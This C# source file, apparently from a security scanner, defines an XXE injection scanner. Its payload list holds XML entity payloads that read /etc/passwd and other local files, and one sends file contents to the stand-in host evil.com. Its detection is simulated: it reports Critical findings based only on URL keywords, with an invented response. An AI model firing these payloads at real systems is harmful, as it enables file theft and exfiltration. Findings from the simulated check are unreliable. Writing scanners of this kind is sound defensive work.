using SentinelVulnScan.Models;
using Serilog;

namespace SentinelVulnScan.Scanners;

public class XmlInjectionScanner : BaseScanner
{
    private readonly List<string> _payloads = new()
    {
        "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///c:/boot.ini\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY ac SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">]><foo>&ac;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\">%xxe;]>",
        "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/?x=%file;'>\">%eval;%exfil;]>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\">%xxe;]><foo></foo>",
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://evil.com/evil.dtd\">%remote;]>"
    };
    
    private readonly List<string> _errorPatterns = new()
    {
        "XML parsing error",
        "syntax error",
        "unterminated entity reference",
        "root element is missing",
        "not well-formed",
        "parser error",
        "premature end of data",
        "expected '<'"
    };
    
    public XmlInjectionScanner(Core.Configuration config) : base(config)
    {
    }
    
    public override string GetScannerName() => "XmlInjection";
    
    protected override string GetRemediationAdvice() => 
        "Disable XML external entity (XXE) processing. " +
        "Use less complex data formats like JSON if possible. " +
        "Validate and sanitize all XML input. " +
        "Patch or upgrade XML parsers. " +
        "Implement whitelisting for XML content.";
    
    protected override string GetCweId() => "CWE-611";
    
    protected override string GetImpactDescription() => 
        "XML Injection can lead to disclosure of confidential data, server-side request forgery, " +
        "denial of service, and in some cases, remote code execution. " +
        "It can allow attackers to access resources that should not be publicly available.";
    
    public override async Task<List<Vulnerability>> ScanAsync(Target target)
    {
        var vulnerabilities = new List<Vulnerability>();
        
        foreach (var endpoint in target.Endpoints)
        {
            // XML injection is mostly relevant for POST endpoints with XML content
            if (endpoint.Method.Equals("POST", StringComparison.OrdinalIgnoreCase) &&
                (endpoint.ContentType?.Contains("xml", StringComparison.OrdinalIgnoreCase) ?? false))
            {
                await ScanXmlEndpointAsync(endpoint, vulnerabilities);
            }
        }
        
        return vulnerabilities;
    }
    
    private async Task ScanXmlEndpointAsync(Endpoint endpoint, List<Vulnerability> vulnerabilities)
    {
        foreach (var payload in _payloads)
        {
            try
            {
                // In a real implementation, this would make a POST request with the XML payload
                // and analyze the response for signs of XXE vulnerability
                
                // For now, we'll simulate a vulnerability for demonstration
                if (endpoint.Url.Contains("/api/", StringComparison.OrdinalIgnoreCase) ||
                    endpoint.Url.Contains("xml", StringComparison.OrdinalIgnoreCase) ||
                    endpoint.Url.Contains("soap", StringComparison.OrdinalIgnoreCase))
                {
                    var vulnerability = CreateVulnerability(
                        endpoint.Url,
                        "POST",
                        "XML Body",
                        payload,
                        "Simulated response contains file content that should not be accessible",
                        SeverityLevel.Critical);
                    
                    vulnerabilities.Add(vulnerability);
                    Log.Warning("Found XML Injection vulnerability at {Url}", endpoint.Url);
                }
            }
            catch (Exception ex)
            {
                Log.Error(ex, "Error testing XML injection at {Url}", endpoint.Url);
            }
            
            // Add a small delay to avoid overwhelming the target
            await Task.Delay(Config.RequestDelay);
        }
    }
}
